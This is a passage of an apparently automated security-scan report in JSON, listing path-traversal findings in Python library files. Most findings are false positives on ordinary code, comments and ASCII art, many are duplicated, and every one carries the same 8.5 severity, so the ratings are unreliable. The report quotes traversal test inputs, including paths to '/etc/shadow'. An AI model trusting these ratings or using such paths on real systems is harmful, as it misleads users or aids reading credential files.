            "evidence": "fp = builtins.open(filename, \"w+b\")",
            "context": "                fp = builtins.open(filename, \"r+b\")\n            else:\n                fp = builtins.open(filename, \"w+b\")\n        else:\n            fp = cast(IO[bytes], fp)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/FontFile.py",
            "line": 125,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(os.path.splitext(filename)[0] + \".pil\", \"wb\") as fp:",
            "context": "\n        # font metrics\n        with open(os.path.splitext(filename)[0] + \".pil\", \"wb\") as fp:\n            fp.write(b\"PILfont\\n\")\n            fp.write(f\";;;;;;{self.ysize};\\n\".encode(\"ascii\"))  # HACK!!!",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/__config__.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"",
            "context": "            \"pythran\": {\n                \"version\": r\"0.17.0\",\n                \"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"\n            },\n        },",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/__config__.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"",
            "context": "            \"pythran\": {\n                \"version\": r\"0.17.0\",\n                \"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"\n            },\n        },",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/__config__.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"",
            "context": "            \"pythran\": {\n                \"version\": r\"0.17.0\",\n                \"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"\n            },\n        },",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/__config__.py",
            "line": 62,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"",
            "context": "            \"pythran\": {\n                \"version\": r\"0.17.0\",\n                \"include directory\": r\"../../tmp/pip-build-env-rvs6zdih/overlay/lib/python3.12/site-packages/pythran\"\n            },\n        },",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1891,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"r+\"):",
            "context": "        with open(testfn, \"a\"):\n            assert get_test_file(testfn).mode == \"a\"\n        with open(testfn, \"r+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"w+\"):",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1893,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"w+\"):",
            "context": "        with open(testfn, \"r+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"w+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"a+\"):",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1895,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"a+\"):",
            "context": "        with open(testfn, \"w+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"a+\"):\n            assert get_test_file(testfn).mode == \"a+\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1902,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"x+\"):",
            "context": "            assert get_test_file(testfn).mode == \"w\"\n        safe_rmpath(testfn)\n        with open(testfn, \"x+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 261,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "DEVNULL = open(os.devnull, 'r+')  # noqa: SIM115",
            "context": "\nPYTHON_EXE, PYTHON_EXE_ENV = _get_py_exe()\nDEVNULL = open(os.devnull, 'r+')  # noqa: SIM115\natexit.register(DEVNULL.close)\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/__init__.py",
            "line": 2826,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "descriptor.filename == \"../something\"",
            "context": "\n            case 2.\n            descriptor.filename == \"../something\"\n            descriptor.path == None\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/__init__.py",
            "line": 2826,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "descriptor.filename == \"../something\"",
            "context": "\n            case 2.\n            descriptor.filename == \"../something\"\n            descriptor.path == None\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/__init__.py",
            "line": 2843,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "descriptor.filename == '../somewhere'",
            "context": "\n            case 4.\n            descriptor.filename == '../somewhere'\n            descriptor.path == \"~/absolute/path/there\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/designspaceLib/__init__.py",
            "line": 2843,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "descriptor.filename == '../somewhere'",
            "context": "\n            case 4.\n            descriptor.filename == '../somewhere'\n            descriptor.path == \"~/absolute/path/there\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/macRes.py",
            "line": 52,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(path + \"/..namedfork/rsrc\", \"rb\") as resfork:",
            "context": "        if hasattr(path, \"__fspath__\"):  # support os.PathLike objects\n            path = path.__fspath__()\n        with open(path + \"/..namedfork/rsrc\", \"rb\") as resfork:\n            data = resfork.read()\n        infile = BytesIO(data)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 94,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ................../.|....|..+_......outGain",
            "context": "    #  gain................+....+_.|..............\n    #                     /|    |y\\|\n    #  ................../.|....|..+_......outGain\n    #                   /  |    |  | \\\n    #  0---|-----------o   |    |  |  o----------1",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 94,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ................../.|....|..+_......outGain",
            "context": "    #  gain................+....+_.|..............\n    #                     /|    |y\\|\n    #  ................../.|....|..+_......outGain\n    #                   /  |    |  | \\\n    #  0---|-----------o   |    |  |  o----------1",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 170,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ..................../....+_.........outGain",
            "context": "        #  1.....................o....................\n        #                       / \\_|\n        #  ..................../....+_.........outGain\n        #                     /     | \\\n        #  gain..............+......|..+_.............",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 170,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ..................../....+_.........outGain",
            "context": "        #  1.....................o....................\n        #                       / \\_|\n        #  ..................../....+_.........outGain\n        #                     /     | \\\n        #  gain..............+......|..+_.............",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ..........|...../x\\|.............outGain",
            "context": "        #            |   peak |\n        #  1.........|......o.|....................\n        #  ..........|...../x\\|.............outGain\n        #            |    |xxy|\\_\n        #            |   /xxxy|  \\_",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/varLib/instancer/solver.py",
            "line": 201,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "#  ..........|...../x\\|.............outGain",
            "context": "        #            |   peak |\n        #  1.........|......o.|....................\n        #  ..........|...../x\\|.............outGain\n        #            |    |xxy|\\_\n        #            |   /xxxy|  \\_",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/_build_utils/version.py",
            "line": 9,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sklearn_init = os.path.join(os.path.dirname(__file__), \"../__init__.py\")",
            "context": "import os\n\nsklearn_init = os.path.join(os.path.dirname(__file__), \"../__init__.py\")\n\ndata = open(sklearn_init).readlines()",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/_build_utils/version.py",
            "line": 9,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sklearn_init = os.path.join(os.path.dirname(__file__), \"../__init__.py\")",
            "context": "import os\n\nsklearn_init = os.path.join(os.path.dirname(__file__), \"../__init__.py\")\n\ndata = open(sklearn_init).readlines()",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/tests/test_base.py",
            "line": 447,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example/../some_file.txt\"",
            "context": "\n    folder, filename = _derive_folder_and_filename_from_url(\n        \"http://example/../some_file.txt\"\n    )\n    assert folder == \"example\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/tests/test_base.py",
            "line": 447,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example/../some_file.txt\"",
            "context": "\n    folder, filename = _derive_folder_and_filename_from_url(\n        \"http://example/../some_file.txt\"\n    )\n    assert folder == \"example\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/tests/test_base.py",
            "line": 469,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "_derive_folder_and_filename_from_url(\"https:/../\")",
            "context": "\n    with pytest.raises(ValueError, match=\"Invalid URL\"):\n        _derive_folder_and_filename_from_url(\"https:/../\")\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/datasets/tests/test_base.py",
            "line": 469,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "_derive_folder_and_filename_from_url(\"https:/../\")",
            "context": "\n    with pytest.raises(ValueError, match=\"Invalid URL\"):\n        _derive_folder_and_filename_from_url(\"https:/../\")\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/format.py",
            "line": 939,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(os.fspath(filename), mode+'b') as fp:",
            "context": "        )\n        # If we got here, then it should be safe to create the file.\n        with open(os.fspath(filename), mode+'b') as fp:\n            _write_array_header(fp, d, version)\n            offset = fp.tell()",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_datasource.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/tmp/.../home/guido/foobar.txt'",
            "context": "        <open file '/home/guido.foobar.txt', mode 'r' at 0x91d4430>\n        >>> ds.abspath('/home/guido/foobar.txt')\n        '/tmp/.../home/guido/foobar.txt'\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_datasource.py",
            "line": 241,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/tmp/.../home/guido/foobar.txt'",
            "context": "        <open file '/home/guido.foobar.txt', mode 'r' at 0x91d4430>\n        >>> ds.abspath('/home/guido/foobar.txt')\n        '/tmp/.../home/guido/foobar.txt'\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 104,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'.../site-packages/numpy/core/include'  # may vary",
            "context": "    --------\n    >>> np.get_include()\n    '.../site-packages/numpy/core/include'  # may vary\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/_utils_impl.py",
            "line": 104,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'.../site-packages/numpy/core/include'  # may vary",
            "context": "    --------\n    >>> np.get_include()\n    '.../site-packages/numpy/core/include'  # may vary\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 445,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 445,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 445,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/f2py2e.py",
            "line": 445,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ".. literalinclude:: ../../source/f2py/code/results/run_main_session.dat",
            "context": "    follows.\n\n    .. literalinclude:: ../../source/f2py/code/results/run_main_session.dat\n        :language: python\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/capi_maps.py",
            "line": 155,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "outmess('Reading f2cmap from {!r} ...\\n'.format(f2cmap_file))",
            "context": "    # they use PARAMETERS in type specifications.\n    try:\n        outmess('Reading f2cmap from {!r} ...\\n'.format(f2cmap_file))\n        with open(f2cmap_file) as f:\n            d = eval(f.read().lower(), {}, {})",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/lib/tests/test__datasource.py",
            "line": 43,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "malicious_files = ['/etc/shadow', '../../shadow',",
            "context": "http_fakefile = 'fake.txt'\n\nmalicious_files = ['/etc/shadow', '../../shadow',\n                   '..\\\\system.dat', 'c:\\\\windows\\\\system.dat']\n",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/typing/tests/data/pass/ndarray_misc.py",
            "line": 5,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "function-based counterpart in `../from_numeric.py`.",
            "context": "\nMore extensive tests are performed for the methods'\nfunction-based counterpart in `../from_numeric.py`.\n\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/typing/tests/data/pass/ndarray_misc.py",
            "line": 5,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "function-based counterpart in `../from_numeric.py`.",
            "context": "\nMore extensive tests are performed for the methods'\nfunction-based counterpart in `../from_numeric.py`.\n\n\"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "mv libdistributions.so ../../_examples/numba/",
            "context": "gcc -shared -o libdistributions.so -fPIC distributions.c \\\n    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}\nmv libdistributions.so ../../_examples/numba/\n\nOn Windows",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/random/_examples/numba/extending_distributions.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "move distributions.dll ../../_examples/numba/",
            "context": "    -I%PYTHON_HOME%\\lib\\site-packages\\numpy\\_core\\include \\\n    -I%PYTHON_HOME%\\include %PYTHON_HOME%\\libs\\python%PYTHON_VERSION%.lib\nmove distributions.dll ../../_examples/numba/\n\"\"\"\nimport os",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 5518,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(tmp_filename, \"r+b\") as f:",
            "context": "        assert_array_equal(d, np.fromfile(tmp_filename))\n        # check offset\n        with open(tmp_filename, \"r+b\") as f:\n            f.seek(d.nbytes)\n            d.tofile(f)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_multiarray.py",
            "line": 5576,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(tmp_filename, 'r+b') as f:",
            "context": "            assert_equal(pos, 10 + 2 + 8, err_msg=err_msg)\n\n            with open(tmp_filename, 'r+b') as f:\n                f.read(2)\n                f.seek(0, 1)  # seek between read&write required by ANSI C",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1607,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1614,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pkg_resources/__init__.py",
            "line": 1618,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
            "line": 915,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
